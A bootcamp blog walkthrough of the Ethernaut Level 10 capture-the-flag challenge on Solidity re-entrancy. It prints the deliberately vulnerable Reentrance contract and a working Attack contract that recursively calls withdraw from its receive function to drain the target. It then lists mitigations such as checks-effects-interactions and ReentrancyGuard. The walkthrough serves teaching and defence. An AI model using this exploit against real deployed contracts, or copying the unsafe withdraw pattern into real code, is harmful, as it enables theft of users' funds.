



Ethernaut Level 10 Walkthrough: Re-entrancy - Metana






















































































 












Skip links* [Skip to primary navigation](#primary-nav)
* [Skip to content](#lqd-site-content)



 





 


 




Call us +1 415 416 0800 


















 [![Metana](https://metana.io/wp-content/uploads/2022/07/Metana-Logo.png)](https://metana.io/) 








* [Solidity BootcampHot 🔥](https://metana.io/web3-solidity-bootcamp-ethereum-blockchain/)
* [Bootcamps](#) 








###### Web3

 






### Web3 Solidity Bootcamp



Most Popular 🔥
The most advanced Solidity curriculum on the internet











### Full Stack Web3 Beginner Bootcamp



New ✨ | Beginner 👨‍💻
Starting off with web development and seamlessly integrating web3 development











### Web3 Rust Bootcamp



Become an expert Solana blockchain developer with one course!














###### Coding + Career Growth

 




 








### Software Engineering Bootcamp



Become a Software Engineer - Balance everyday life commitments & launch your coding career in as little as 16 weeks











### Metana's JobCamp™️



Learn to make a lasting first impressions, network effectively & search for jobs with confidence.















 ![](https://metana.io/wp-content/uploads/2023/10/Screenshot-2023-10-25-at-7.51.33 PM-300x61.png) 




 Rated
the Best

 





 Ranked as the industry's premier Web3 bootcamp with a stellar 4.8/5 star rating on Course Report.

 




[Read more reviews here](/reviews/)












[Still Unsure?](https://formless.ai/c/6bPi6ASGJ4ge)
* [Resources](#)
	+ [Reviews](https://metana.io/reviews/)
	+ [Metana’s Job Guarantee](https://metana.io/job-guarantee/)
	+ [Tuition](https://metana.io/tuition/)
	+ [Events](https://metana.io/events/)
* [Blog](https://metana.io/blog/)

 





[Apply now](https://metana.typeform.com/general)






















 







 [![Metana](https://metana.io/wp-content/uploads/2022/07/Metana-Logo.png)](https://metana.io/) 









Metana Bootcamps
----------------

 






* [Solidity BootcampHot 🔥](https://metana.io/web3-solidity-bootcamp-ethereum-blockchain/)
* [Full Stack Web3 Bootcamp](https://metana.io/web3-beginner-bootcamp/)
* [Rust Bootcamp](https://metana.io/web3-rust-bootcamp-solana-blockchain/)
* [Cybersecurity Bootcamp](https://metana.io/cybersecurity-bootcamp/)
* [AI & Machine Learning Bootcamp](https://metana.io/ai-machine-learning-bootcamp/)
* [Data Analytics Bootcamp](https://metana.io/data-analytics-bootcamp/)
* [Data Science Bootcamp](https://metana.io/data-science-bootcamp/)
* [Full Stack Bootcamp](https://metana.io/full-stack-software-engineer-bootcamp/)
* [Jobcamp](https://metana.io/jobcamp/)

 














Menu Items
----------

 






* [Blog](https://metana.io/blog/)
* [Metana’s Job Guarantee](https://metana.io/job-guarantee/)
* [Refer a Friend](https://metana.io/refer/)
* [Tuition](https://metana.io/tuition/)
* [Withdrawal and Refund Policy](https://metana.io/withdrawal-and-refund-policy/)

 









 








 [[email protected]](/cdn-cgi/l/email-protection)

 




 

[Facebook](https://www.facebook.com/metanahq) 


[Twitter](https://twitter.com/metanahq) 


[Linkedin](https://www.linkedin.com/school/metana/) 


























 [![Metana](https://metana.io/wp-content/uploads/2022/07/Metana-Logo.png)](https://metana.io/) 




[Apply now](https://metana.typeform.com/general)
























 
#### Table of Contents





 







Ethernaut Level 10 Walkthrough: Re-entrancy
===========================================

 



 * [Georgi Plamenov](https://metana.io/blog/author/georgi-plamenov/)
* [June 7, 2024](https://metana.io/blog/2024/06/07/)
* [Ethernaut Walkthrough](https://metana.io/blog/category/ethernaut-walkthrough/)














Understanding re-entrancy is crucial for anyone developing or auditing Ethereum smart contracts. Failure to properly handle re-entrant calls can result in the loss of funds or the manipulation of contract state by malicious actors. By learning about re-entrancy and how to mitigate its risks, especially through practical challenges like **Ethernaut Level 10** **walkthrough**, developers can significantly enhance the security of their smart contracts.


Ethernaut Challenge 10: A Case Study
------------------------------------


![ethernaut level 10walkthroughethernaut challenge](https://metana.io/wp-content/uploads/2024/06/Problem-solving-rafiki.svg)
To illustrate the concept of re-entrancy, let’s examine a solution to **Ethernaut Challenge 10.** In this challenge, participants are tasked with exploiting a vulnerable contract that allows for re-entrant calls during a withdrawal function.


### The Vulnerable Contract



```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {

  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

Pay attention to the `withdraw` function. The function calls an external function before it updates its internal state. This provides an opportunity for a malicious attack on the contract.


### Examining the Contract


The crux of this challenge lies in understanding the workings of the `Reentrance` contract. Let’s dissect its key components:


* **State Variables:**



```
  mapping(address => uint) public balances;
```

Stores user balances to facilitate withdrawals.


* **Functions:**
	+ `donate`: Allows users to donate ETH to another address. `function donate(address _to) public payable { balances[_to] = balances[_to].add(msg.value); }` This function updates the balance of the recipient address with the donated ETH.
	+ `balanceOf`: Retrieves the balance of a specific address. `function balanceOf(address _who) public view returns (uint balance) { return balances[_who]; }` Simply returns the balance of the queried address.
	+ `receive`: Enables the contract to receive arbitrary amounts of ETH. `receive() external payable {}` This function is a potential gateway for re-entrancy attacks due to its ability to execute arbitrary code.
	+ `withdraw`: Facilitates withdrawals of ETH by users.  
	`solidity function withdraw(uint256 _amount) public { if (balances[msg.sender] >= _amount) { (bool result ) = msg.sender.call{value: _amount}(""); if (result) { _amount; } balances[msg.sender] -= _amount; } }`  
	This function allows users to withdraw ETH, but it’s vulnerable to reentrancy attacks due to its flawed design.


The Solution: Attack Contract
-----------------------------


The attack contract can be implemented in many ways. Here’s a breakdown of the key components:



```
interface IReentrance {
  function donate(address) external payable;
  function withdraw(uint256) external;
}

contract Attack {
  IReentrance target;

  constructor(address payable _target) {
    target = IReentrance(_target);
  }

  function donate() external payable {
    target.donate{value: msg.value}(address(this));
  }

  function attack() external {
    target.withdraw(0.001 ether);
  }

  receive() external payable {
    if (address(target).balance > 0) {
      target.withdraw(0.001 ether);
    }
  }

  function withdraw() external {
    msg.sender.call{value: address(this).balance}("");
  }
}
```

### Explanation:


* **Interface:**



```
  interface IReentrance {
    function donate(address) external payable;
    function withdraw(uint256) external;
  }
```

The attack contract interfaces with the vulnerable contract using the `IReentrance` interface, which defines the `donate` and `withdraw` functions.


* **Constructor:**



```
  constructor(address payable _target) {
    target = IReentrance(_target);
  }
```

Initializes the target contract address.


* **Donation:**



```
  function donate() external payable {
    target.donate{value: msg.value}(address(this));
  }
```

Allows anyone to send Ether to the target contract. This is necessary to be able to attack the contract.


* **Attack:**



```
  function attack() external {
    target.withdraw(0.001 ether);
  }
```

Because we already donated some funds, we can now freely call the `withdraw` function. The attack function calls the target contract’s `withdraw` function, starting the exploitation of the re-entrancy vulnerability.


* **Fallback Function:**



```
  receive() external payable {
    if (address(target).balance > 0) {
      target.withdraw(0.001 ether);
    }
  }
```

When we call the victim contract’s `withdraw` function, our (Attack) contract’s fallback function is invoked when the target contract sends Ether back, allowing for further re-entrant calls.


* **Withdraw:**



```
  function withdraw() external {
    msg.sender.call{value: address(this).balance}("");
  }
```

Once drained, we can now withdraw the funds from our attack contract.


Avoiding Re-entrancy
--------------------


1. **Use the Checks-Effects-Interactions Pattern:**  
Follow the principle of performing all necessary checks first, then executing state updates, emitting events, and finally interacting with external contracts. This ensures that critical state changes are made before any external interactions, reducing the likelihood of re-entrancy exploits.



2. **Implement Re-entrancy Guards:**  
Utilize dedicated libraries like OpenZeppelin’s `ReentrancyGuard`, which provides a simple modifier to protect functions from re-entrancy attacks. These guards ensure that functions can only be called once, preventing recursive calls and potential re-entrancy exploits.



3. **Avoid External Calls Before State Changes:**  
If external calls are necessary, ensure that they occur after all state changes have been applied. This prevents attackers from exploiting inconsistencies in contract state during re-entrant calls.



4. **Thorough Testing and Auditing:**  
Conduct comprehensive testing, including both unit tests and integration tests, to identify and mitigate potential re-entrancy vulnerabilities. Engage in code reviews and security audits by experienced professionals to uncover any overlooked vulnerabilities and ensure the robustness of your contract code.



5. **Stay Informed and Updated:**  
Keep abreast of the latest developments in Ethereum smart contract security and best practices. Regularly update your contracts and dependencies to leverage improvements and patches that address known vulnerabilities, including those related to re-entrancy.


By incorporating these practices into your smart contract development workflow, you can significantly reduce the risk of re-entrancy exploits and enhance the security of your decentralized applications. Remember that security is an ongoing process, and vigilance is key to maintaining the integrity of your contracts in the ever-evolving landscape of blockchain technology.


Conclusion: Ethernaut Level 10
------------------------------


Understanding and mitigating re-entrancy vulnerabilities is essential for the secure development and auditing of Ethereum smart contracts. Practical challenges like Ethernaut Level 10 provide hands-on experience with real-world scenarios where re-entrancy attacks can happen. By using best practices such as the Checks-Effects-Interactions pattern, re-entrancy guards, and thorough testing and auditing, developers can reduce the risk of these exploits. 


Staying informed about the latest security developments and regularly updating contract code is crucial in maintaining the integrity and security of decentralized applications. Prioritizing security and vigilance helps ensure robust protection against malicious actors and enhances the trustworthiness of smart contracts.



![faq](https://metana.io/wp-content/uploads/2024/05/Questions-bro-1.svg)
FAQs
----


**What is the DAO hack, and how did it impact the Ethereum ecosystem?**


* The DAO hack occurred in 2016 when an attacker exploited a re-entrancy vulnerability in the DAO smart contract, draining approximately one-third of the funds raised through the DAO’s crowd sale. This exploit resulted in a contentious hard fork of the Ethereum blockchain to reverse the stolen funds, leading to the creation of Ethereum Classic.


**How can developers identify re-entrancy vulnerabilities in their smart contracts during the development process?**


* Developers can identify re-entrancy vulnerabilities by conducting thorough code reviews, performing static analysis using tools like MythX or Slither, and conducting comprehensive unit and integration tests. Additionally, developers can use automated security scanners and auditing services to identify potential vulnerabilities in their contracts.


**How do re-entrancy vulnerabilities differ from other types of vulnerabilities in smart contracts?**


* Re-entrancy vulnerabilities differ from other types of vulnerabilities in smart contracts in that they involve recursive calls to functions that modify contract state. While other vulnerabilities may involve incorrect logic or insecure implementation practices, re-entrancy vulnerabilities specifically exploit the order of execution in contract functions to manipulate state or steal funds.


**How are fallback and receive functions related to re-entrancy vulnerabilities in smart contracts?**


* Fallback and receive functions can serve as entry points for re-entrancy attacks in smart contracts. These functions are invoked when a contract receives Ether without specifying a function to call, providing an opportunity for malicious actors to execute arbitrary code, including recursive calls to the contract’s functions.






![](https://metana.io/wp-content/uploads/2024/06/Ethernaut-Level-10-Walkthrough-Re-entrancy_.jpg) 





[PrevPreviousJavascript Window: Browser Object Model (BOM)](https://metana.io/blog/javascript-window-browser-object-model-bom/) 




[NextHTML vs DOM Explained: Building WebsitesNext](https://metana.io/blog/html-vs-dom-explained-building-websites/) 







#### Metana Guarantees  a Job 💼

 





#### Plus Risk Free 2-Week Refund Policy ✨

 




 You’re guaranteed a new job in web3—or you’ll get a full tuition refund. We also offer a hassle-free two-week refund policy. If you’re not satisfied with your purchase for any reason, you can request a refund, no questions asked.

 






Web3 Solidity Bootcamp
======================

 





 The most advanced Solidity curriculum on the internet!

 




* 4 Months
* Prior coding experience required
* 20h/ Week
* 1-on-1 mentorship
* Expert code reviews
* Coaching & career services






[View Program](/web3-solidity-bootcamp-ethereum-blockchain/)







Full Stack Web3 Beginner Bootcamp
=================================

 





 Learn foundational principles while gaining hands-on experience with Ethereum, DeFi, and Solidity.

 




* 7 Months
* Beginner - Zero to Hero
* 25h/ Week
* Your very own personal support tutor
* 1-on-1 mentorship
* Expert code reviews
* Coaching & career services






[View Program](/web3-beginner-bootcamp/)













You may also like
-----------------

 






![](https://metana.io/wp-content/uploads/2024/07/Protect-Yourself-from-Rug-Pulls-Tips-to-Avoid-Crypto-Scams-640x364.jpg)







### [Metana Editorial](https://metana.io/blog/author/editorial/)




9 mins ago

#### [Protect Yourself from Rug Pulls: Tips to Avoid Crypto Scams](https://metana.io/blog/protect-yourself-from-rug-pulls-tips-to-avoid-crypto-scams/)




The world of Web3 is brimming with promises of high returns and revolutionary projects, driving 


![](https://metana.io/wp-content/uploads/2024/07/ERC-Token-Standards-Your-Simplified-Guide-copy-640x364.jpg)







### [Metana Editorial](https://metana.io/blog/author/editorial/)




1 day ago

#### [Address Poisoning in Smart Contracts](https://metana.io/blog/address-poisoning-in-smart-contracts/)




Web3 thrives on user empowerment and the ease of sending and receiving cryptocurrency. However, a 
 







#### Metana Guarantees  a Job 💼

 





#### Plus Risk Free 2-Week Refund Policy

 




You’re guaranteed a new job in web3—or you’ll get a full tuition refund. We also offer a hassle-free two-week refund policy. If you’re not satisfied with your purchase for any reason, you can request a refund, no questions asked.

 






#### Web3 Solidity Bootcamp

 





 The most advanced Solidity curriculum on the internet

 




* 4 Months
* Prior coding experience required
* 20h/ Week
* 1-on-1 mentorship
* Expert code reviews
* Coaching & career services






[View Program](/web3-solidity-bootcamp-ethereum-blockchain/)







Full Stack Web3 Beginner Bootcamp
=================================

 





 Learn foundational principles while gaining hands-on experience with Ethereum, DeFi, and Solidity.

 




* 7 Months
* Beginner - Zero to Hero
* 25h/ Week
* Your very own personal support tutor
* 1-on-1 mentorship
* Expert code reviews
* Coaching & career services







 Learn foundational principles while gaining hands-on experience with Ethereum, DeFi, and Solidity.

 




[View Program](/web3-beginner-bootcamp/)







Events by Metana
================

 





 Dive into the exciting world of Web3 with us as we explore cutting-edge technical topics, provide valuable insights into the job market landscape, and offer guidance on securing lucrative positions in Web3. 

 




 





 







Do you have anything you want us to cover in our blog posts? What should we talk about next? We need your suggestions! 
 





Submit
















Start Your  Application
-----------------------

 






Secure your spot now. Spots are limited, and we accept qualified applicants on a first come, first served basis..




 






Email(Required)

Career Track(Required)


Web3



Data



Full Stack



Cyber

  








Δ










The application is free and takes just 3 minutes to complete.

 















##### What is included in the course?

 






### Expert-curated curriculum










### Weekly 1:1 video calls with your mentor










### Weekly group mentoring calls










### On-demand mentor support










### Portfolio reviews by Design hiring managers










### Resume & LinkedIn profile reviews










### Active online student community










### 1:1 and group career coaching calls










### Access to our employer network










### Job Guarantee




















 






###### Address

 





 44 Montgomery St,   

San Francisco, CA 94104, United States

 












Email 







Subscribe












###### Contact us

 





###### Call us directly

 





 (415) 416-0800

 





###### Mail us directly

 





 [[email protected]](/cdn-cgi/l/email-protection)

 









### Company

 




* [Home](/)
* [Blog](https://metana.io/blog/)
* [Jobs at Metana](/jobs/)
* [Bootcamp Application](https://metana.io/apply/)
* [Refer a friend](/refer/)
* [Student Perks](/perks/)
* [Testimonials](/reviews)
* [LMS login](https://app.metana.io/)
* [Open LMS login (Full Stack)](https://open.metana.io/)









### Bootcamp

 




* [Web3 Bootcamps](https://metana.io/web3-0-bootcamp/)
* [- Solidity Bootcamp](https://metana.io/web3-solidity-bootcamp-ethereum-blockchain/)
* [- Web3 Beginner Bootcamp](https://metana.io/web3-solidity-bootcamp-ethereum-blockchain/)
* [- Rust Bootcamp](https://metana.io/web3-rust-bootcamp-solana-blockchain/)
* [- ZK Bootcamp](/web3-zero-knowledge-bootcamp/)
* [Data + AI bootcamps](#)
* [- Data Analytics Bootcamp](/data-analytics-bootcamp/)
* [- Data Science Bootcamp](/data-science-bootcamp/)
* [- AI/ML Bootcamp](/ai-machine-learning-bootcamp/)
* [Software Engineering Bootcamp](/full-stack-software-engineer-bootcamp/)
* [Cybersecurity Bootcamp](/cybersecurity-bootcamp/)
* [Jobcamp](/jobcamp/)
* [Tuition](https://metana.io/tuition/)









### For businesses

 




* [Business](https://metana.io/business/)
* [- Hiring Partner](https://metana.io/business/hiring-partner/)
* [- Upskill Your Team](/business/upskill-your-team/)









### Legal

 




* [Licences](https://metana.io/licences/)
* [Metana's Job Guarantee](https://metana.io/job-guarantee/)
* [Withdrawal and Refund Policy](https://metana.io/withdrawal-and-refund-policy/)
* [Privacy Policy](/privacy-policy/)













[Still Unsure?](https://formless.ai/c/6bPi6ASGJ4ge)








[![](https://metana.io/wp-content/uploads/2022/07/Metana-Logo-Black-Full.png)](https://metana.io) 







 Disclaimer:
‍
Metana is involved in the Blockchain Education activities only. We are not dealing with any Crypto related stuff nor provide advice in the Crypto related field.

 

















 Metana is a pioneer in education and career transformation, specializing in today’s most in-demand skills. The leading source for training, staffing, and career transitions, we foster a flourishing community of professionals pursuing careers they love.
| © 2023 Edmore (private) limited

 








[Facebook](https://www.facebook.com/metanahq) 





[Linkedin](https://www.linkedin.com/school/metana/) 














































































Adding {{itemName}} to cart


Added {{itemName}} to cart













Loading...



×






